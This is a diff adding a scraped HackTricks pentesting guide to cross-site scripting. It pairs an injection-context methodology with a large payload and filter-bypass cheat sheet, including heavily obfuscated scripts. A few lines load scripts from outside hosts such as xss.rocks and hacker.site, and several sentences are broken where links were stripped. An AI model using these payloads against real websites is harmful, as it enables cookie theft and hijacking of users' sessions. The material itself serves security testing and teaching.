@@ -1,0 +1,760 @@
+
+
+##############################
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+##############################
+
+
+XSS (Cross Site Scripting)
+Methodology
+Check if any value you control (parameters, path, headers?, cookies?) is being reflected in the HTML or used by JS code.
+Find the context where it's reflected/used.
+If reflected
+Check which symbols can you use and depending on that, prepare the payload:
+In raw HTML: 
+Can you create new HTML tags?
+Can you use events or attributes supporting javascript: protocol?
+Can you bypass protections?
+Is the HTML content being interpreted by any client side JS engine (AngularJS, VueJS, Mavo...), you could abuse a 
+.
+If you cannot create HTML tags that execute JS code, could you abuse a 
+
+    ?
+
+Inside a HTML tag:
+Can you exit to raw HTML context?
+Can you create new events/attributes to execute JS code?
+Does the attribute where you are trapped support JS execution?
+
+    Can you bypass protections?
+
+Inside JavaScript code:
+Can you escape the <script> tag?
+Can you escape the string and execute different JS code?
+Are your input in template literals ``?
+
+            Can you bypass protections?
+
+If used:
+
+        You could exploit a DOM XSS, pay attention how your input is controlled and if your controlled input is used by any sink.
+
+Reflected values
+In order to successfully exploit a XSS the first thing you need to find is a value controlled by you that is being reflected in the web page.
+Intermediately reflected: If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a Reflected XSS.
+Stored and reflected: If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a Stored XSS.
+
+    Accessed via JS: If you find that a value controlled by you is being access using JS you could exploit a DOM XSS.
+
+Contexts
+When trying to exploit a XSS the first thing you need to know if where is your input being reflected. Depending on the context, you will be able to execute arbitrary JS code on different ways.
+Raw HTML
+If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: <img , <iframe , <svg , <script ... these are just some of the many possible HTML tags you could use.
+Also, keep in mind 
+.
+Inside HTML tags attribute
+If your input is reflected inside the value of the attribute of a tag you could try:
+To escape from the attribute and from the tag (then you will be in the raw HTML) and create new HTML tag to abuse: "><img [...]
+If you can escape from the attribute but not from the tag (> is encoded or deleted), depending on the tag you could create an event that executes JS code: " autofocus onfocus=alert(1) x="
+If you cannot escape from the attribute (" is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example, if you control an event like onclick= you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute href, where you can use the javascript: protocol to execute arbitrary code: href="javascript:alert(1)"
+
+    If your input is reflected inside "unexpoitable tags" you could try the accesskey trick to abuse the vuln (you will need some kind of social engineer to exploit this): " accesskey="x" onclick="alert(1)" x="
+
+Inside JavaScript code
+In this case your input is reflected between <script> [...] </script> tags of a HTML page, inside a .jsfile or inside an attribute using javascript: protocol:
+If reflected between <script> [...] </script> tags, even if your input if inside any kind of quotes, you can try to inject </script> and escape from this context. This works because the browser will first parse the HTML tags and then the content, therefore, it won't notice that your injected </script> tag is inside the HTML code.
+If reflected inside a JS string and the last trick isn't working you would need to exit the string, execute your code and reconstruct the JS code (if there is any error, it won't be executed:
+'-alert(1)-'
+';-alert(1)//
+
+    \';alert(1)//
+
+    If reflected inside template literals `` you can embed JS expressions using ${ ... } syntax: `var greetings =Hello, ${alert(1)}```
+
+DOM
+There is JS code that is using unsafely some data controlled by an attacker like location.href . An attacker, could abuse this to execute arbitrary JS code.
+Universal XSS
+These kind of XSS can be found anywhere. They not depend just on the client exploitation of a web application but on any context. These kind of arbitrary JavaScript execution can even be abuse to obtain RCE, read arbitrary files in clients and servers, and more.
+Some examples:
+WAF bypass encoding image
+from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21
+Injecting inside raw HTML
+When your input is reflected inside the HTML page or you can escape and inject HTML code in this context the first thing you need to do if check if you can abuse < to create new tags: Just try to reflect that char and check if it's being HTML encoded or deleted of if it is reflected without changes. Only in the last case you will be able to exploit this case.
+For this cases also keep in mind 
+.
+Note: A HTML comment can be closed using --> or --!>
+In this case and if no black/whitelisting is used, you could use payloads like:
+<script>alert(1)</script>
+<img src=x onerror=alert(1) />
+<svg onload=alert('XSS')>
+But, if tags/attributes black/whitelisting is being used, you will need to brute-force which tags you can create.
+Once you have located which tags are allowed, you would need to brute-force attributes/events inside the found valid tags to see how you can attack the context.
+Tags/Events brute-force
+Go to 
+ and click on Copy tags to clipboard. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags (in the same web page click on Copy events to clipboard and follow the same procedure as before).
+Custom tags
+If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the onfocus attribute. In the XSS request, you need to end the URL with # to make the page focus on that object and execute the code:
+/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
+Blacklist Bypasses
+If some kind of blacklist is being used you could try to bypass it with some silly tricks:
+//Random capitalization
+<script> --> <ScrIpT>
+<img --> <ImG
+​
+//Double tag, in case just the first match is removed
+<script><script>
+<scr<script>ipt>
+<SCRscriptIPT>alert(1)</SCRscriptIPT>
+​
+//You can substitude the space to separate attributes for:
+/
+/*%00/
+/%00*/
+%2F
+%0D
+%0C
+%0A
+%09
+​
+//Unexpected parent tags
+<svg><x><script>alert('1'&#41</x>
+​
+//Unexpected weird attributes
+<script x>
+<script a="1234">
+<script ~~~>
+<script/random>alert(1)</script>
+<script      ///Note the newline
+>alert(1)</script>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+​
+//Not closing tag, ending with " <" or " //"
+<iframe SRC="javascript:alert('XSS');" <
+<iframe SRC="javascript:alert('XSS');" //
+​
+//Extra open
+<<script>alert("XSS");//<</script>
+​
+//Just weird an unexpected, use your imagination
+<</script/script><script>
+<input type=image src onerror="prompt(1)">
+​
+//Using `` instead of parenthesis
+onerror=alert`1`
+​
+//Use more than one
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
+Length bypass (XSS in 20chars)
+Taken from the blog of 
+.
+<svg/onload=alert``>
+<script src=//aa.es>
+<script src=//℡㏛.pw>
+The last one is using 2 unicode characters which expands to 5: telsr
+More of these characters can be found .
+To check in which characters are decomposed check .
+More tiny XSS for different environments payload  and 
+.
+Click XSS - Clickjacking
+If in order to exploit the vulnerability you need the user to click a link or a form with prepopulated data you could try to 
+ (if the page is vulnerable).
+Impossible - Dangling Markup
+If you just think that it's impossible to create an HTML tag with an attribute to execute JS code, you should check 
+because you could exploit the vulnerability without executing JS code.
+Injecting inside HTML tag
+Inside the tag/escaping from attribute value
+If you are in inside a HTML tag, the first thing you could try is to escape from the tag and use some of the techniques mentioned in the 
+ to execute JS code.
+If you cannot escape from the tag, you could create new attributes inside the tag to try to execute JS code, for example using some payload like (note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag):
+" autofocus onfocus=alert(document.domain) x="
+Style events
+<p style="animation: x;" onanimationstart="alert()">XSS</p>
+<p style="animation: x;" onanimationend="alert()">XSS</p>
+​
+#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
+<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
+#moving your mouse anywhere over the page (0-click-ish):
+<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
+Within the attribute
+Even if you cannot escape from the attribute (" is being encoded or deleted), depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example, if you control an event like onclick= you will be able to make it execute arbitrary code when it's clicked.
+Another interesting example is the attribute href, where you can use the javascript: protocol to execute arbitrary code: href="javascript:alert(1)"
+Bypass inside event using HTML encoding/URL encode
+The HTML encoded characters inside the value of HTML tags attributes are decoded on runtime. Therefore something like the following will be valid (the payload is in bold): <a id="author" href="http://none" onclick="var tracker='http://foo?&apos;-alert(1)-&apos;';">Go Back </a>
+Note that any kind of HTML encode is valid:
+//HTML entities
+&apos;-alert(1)-&apos;
+//HTML hex without zeros
+&#x27-alert(1)-&#x27
+//HTML hex with zeros
+&#x00027-alert(1)-&#x00027
+//HTML dec without zeros
+&#39-alert(1)-&#39
+//HTML dec with zeros
+&#00039-alert(1)-&#00039
+​
+<a href="javascript:var a='&apos;-alert(1)-&apos;'">
+Note that URL encode will also work:
+<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
+Bypass inside event using Unicode encode
+//For some reason you can use unicode to encode "alert" but not "(1)"
+<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
+<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
+Special Protocols Within the attribute
+There you can use the protocols javascript: or data: in some places to execute arbitrary JS code. Some will require user interaction on some won't. 
+javascript:alert(1)
+JavaSCript:alert(1)
+javascript:%61%6c%65%72%74%28%31%29 //URL encode
+javascript&colon;alert(1)
+javascript&#x003A;alert(1)
+javascript&#58;alert(1)
+&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
+java        //Note the new line 
+script:alert(1)
+​
+data:text/html,<script>alert(1)</script>
+DaTa:text/html,<script>alert(1)</script>
+data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
+data:text/html;charset=UTF-8,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
+data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
+Places where you can inject these protocols
+In general the javascript: protocol can be used in any tag that accepts the attribute href and in most of the tags that accepts the attribute src (but not <img)
+<a href="javascript:alert(1)">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
+<form action="javascript:alert(1)"><button>send</button></form>
+<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
+<object data=javascript:alert(3)>
+<iframe src=javascript:alert(2)>
+<embed src=javascript:alert(1)>
+​
+<object data="data:text/html,<script>alert(5)</script>">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
+<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
+<iframe src="data:text/html,<script>alert(5)</script>"></iframe>
+​
+//Special cases
+<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf 
+<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf 
+<iframe srcdoc="<svg onload=alert(4);>">
+Other obfuscation tricks
+In this case the HTML encoding and the Unicode encoding trick from the previous section is also valid as you are inside an attribute.
+<a href="javascript:var a='&apos;-alert(1)-&apos;'">
+Moreover, there is another nice trick for these cases: Even if your input inside javascript:... is being URL encoded, it will be URL decoded before it's executed. So, if you need to escape from the string using a single quote and you see that it's being URL encoded, remember that it doesn't matter, it will be interpreted as a single quote during the execution time.
+&apos;-alert(1)-&apos;
+%27-alert(1)-%27
+<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
+Note that if you try to use both URLencode + HTMLencode in any order to encode the payload it won't work, but you can mix them inside the payload.
+Using Hex and Octal encode with javascript:
+You can use Hex and Octal encode inside the src attribute of iframe (at least) to declare HTML tags to execute JS:
+//Encoded: <svg onload=alert(1)>
+// This WORKS
+<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
+<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />
+​
+//Encoded: alert(1)
+// This doesn't work
+<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
+<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
+Reverse tab nabbing
+<a target="_blank" rel="opener"
+If you can inject any URL in an arbitrary <a href= tag that contains the target="_blank" and rel="opener" attributes, check the following page to exploit this behavior:
+on Event Handlers Bypass
+First of all check this page (
+) for useful "on" event handlers.
+In case there is some blacklist preventing you from creating this even handlers you can try the following bypasses:
+<svg onload%09=alert(1)> //No safari
+<svg %09onload=alert(1)>
+<svg %09onload%20=alert(1)>
+<svg onload%09%20%28%2c%3b=alert(1)>
+​
+//chars allowed between the onevent and the "="
+IExplorer: %09 %0B %0C %020 %3B
+Chrome: %09 %20 %28 %2C %3B
+Safari: %2C %3B
+Firefox: %09 %20 %28 %2C %3B
+Opera: %09 %20 %2C %3B
+Android: %09 %20 %28 %2C %3B
+XSS in "Unexploitable tags" (input hidden, link, canonical)
+From 
+:
+You can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector:
+<input type="hidden" accesskey="X" onclick="alert(1)">
+The XSS payload will be something like this: " accesskey="x" onclick="alert(1)" x="
+Blacklist Bypasses
+Several tricks with using different encoding were exposed already inside this section. Go back to learn where can you use HTML encoding, Unicode encoding, URL encoding, Hex and Octal encoding and even data encoding.
+Bypasses for HTML tags and attributes
+Read the
+.
+Bypasses for JavaScript code
+Read the J
+.
+Injecting inside JavaScript code
+In these case you input is going to be reflected inside the JS code of a .js file or between <script>...</script> tags or between HTML events that can execute JS code or between attributes that accepts the javascript: protocol.
+Escaping <script> tag
+If your code is inserted within <script> [...] var input = 'reflected data' [...] </script> you could easily escape closing the <script> tag:
+</script><img src=1 onerror=alert(document.domain)>
+Note that in this example we haven't even closed the single quote, but that's not necessary as the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.
+Inside JS code
+If <> are being sanitised you can still escape the string where your input is being located and execute arbitrary JS. It's important to fix JS syntax, because if there are any errors, the JS code won't be executed:
+'-alert(document.domain)-'
+';alert(document.domain)//
+\';alert(document.domain)//
+Template literals ``
+In order to construct strings apart from single and double quotes JS also accepts backticks `` . This is known as template literals as they allow to embedded JS expressions using ${ ... } syntax.  
+Therefore, if you find that your input is being reflected inside a JS string that is using backticks, you can abuse the syntax ${ ... } to execute arbitrary JS code:
+This can be abused using: ${alert(1)}
+Encoded code execution
+<script>\u0061lert(1)</script>
+<svg><script>alert&lpar;'1'&rpar;
+<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
+<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
+​
+JavaScript bypass blacklists techniques
+Strings
+"thisisastring"
+'thisisastrig'
+`thisisastring`
+/thisisastring/ == "/thisisastring/"
+/thisisastring/.source == "thisisastring"
+String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
+"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
+"\164\150\151\163\151\163\141\163\164\162\151\156\147"
+"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
+"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
+"\a\l\ert\(1\)"
+atob("dGhpc2lzYXN0cmluZw==")
+eval(8680439..toString(30))(983801..toString(36))
+Space substitutions inside JS code
+<TAB>
+/**/
+JavaScript without parentheses
+alert`1`
+<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
+eval.call`${'alert\x2823\x29'}`
+eval.apply`${[`alert\x2823\x29`]}`
+​
+​
+​
+
+    ​
+
+JavaScript comments (from 
+ trick)
+//This is a 1 line comment
+/* This is a multiline comment*/
+#!This is a 1 line comment, but "#!" must to be at the beggining of the line
+-->This is a 1 line comment, but "-->" must to be at the beggining of the line
+JavaScript new lines (from 
+ trick)
+//Javascript interpret as new line these chars:
+String.fromCharCode(10) //0x0a
+String.fromCharCode(13) //0x0d
+String.fromCharCode(8232) //0xe2 0x80 0xa8
+String.fromCharCode(8233) //0xe2 0x80 0xa8
+Arbitrary function (alert) call
+//Eval like functions
+eval('ale'+'rt(1)')
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Function('ale'+'rt(10)')``;
+[].constructor.constructor("alert(document.domain)")``
+[]["constructor"]["constructor"]`$${alert()}```
+​
+//General function executions
+`` //Can be use as parenthesis
+alert`document.cookie`
+alert(document['cookie']) 
+with(document)alert(cookie) 
+(alert)(1)
+(alert(1))in"."
+a=alert,a(1)
+[1].find(alert)
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+top[/al/.source+/ert/.source](1)
+top[8680439..toString(30)](1)
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
+x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
+this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
+globalThis[`al`+/ert/.source]`1`
+this[`al`+/ert/.source]`1`
+[alert][0].call(this,1)
+window['a'+'l'+'e'+'r'+'t']()
+window['a'+'l'+'e'+'r'+'t'].call(this,1)
+top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
+(1,2,3,4,5,6,7,8,alert)(1)
+x=alert,x(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+al\u0065rt`1`
+top['al\145rt'](1)
+top['al\x65rt'](1)
+top[8680439..toString(30)](1)
+<svg><animate onbegin=alert() attributeName=x></svg>
+DOM vulnerabilities
+There is JS code that is using unsafely data controlled by an attacker like location.href . An attacker, could abuse this to execute arbitrary JS code.
+Due to the extension of the explanation of 
+:
+There you will find a detailed explanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them.
+Also, don't forget that at the end of the mentioned post you can find an explanation about 
+.
+Other Bypasses
+Normalised Unicode
+You could check is the reflected values are being unicode normalized in the server (or in the client side) and abuse this functionality to bypass protections. 
+.
+PHP FILTER_VALIDATE_EMAIL flag Bypass
+"><svg/onload=confirm(1)>"@x.y
+Ruby-On-Rails bypass
+Due to RoR mass assignment quotes are inserted in the HTML and then the quote restriction is bypassed and additoinal fields (onfocus) can be added inside the tag.
+Form example (
+), if you send the payload:
+contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
+The pair "Key","Value" will be echoed back like this:
+{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
+Then, the onfocus attribute will be inserted:
+A XSS occurs.
+Special combinations
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<input type=image src onerror="prompt(1)">
+<svg onload=alert(1)//
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src='1' onerror='alert(0)' <
+<script x> alert(1) </script 1=2
+<script x>alert('XSS')<script y>
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+<svg////////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~>
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert('1'&#41</x>
+<iframe src=""/srcdoc='<svg onload=alert(1)>'>
+<svg><animate onbegin=alert() attributeName=x></svg>
+<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
+<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
+XSS with header injection in a 302 response
+If you find that you can inject headers in a 302 Redirect response you could try to make the browser execute arbitrary JavaScript. This is not trivial as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.
+In  and 
+ you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.
+Past known protocols: mailto://, //x:1/, ws://, wss://, empty Location header, resource://.
+Obfuscation & Advanced Bypass
+​
+​
+​
+ 
+​
+ 
+​
+ 
+​
+​
+More sofisticated JSFuck: 
+​
+​
+​
+​
+
+    ​
+
+//Katana
+<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
+//JJencode 
+<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
+//JSFuck
+<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
+//aaencode
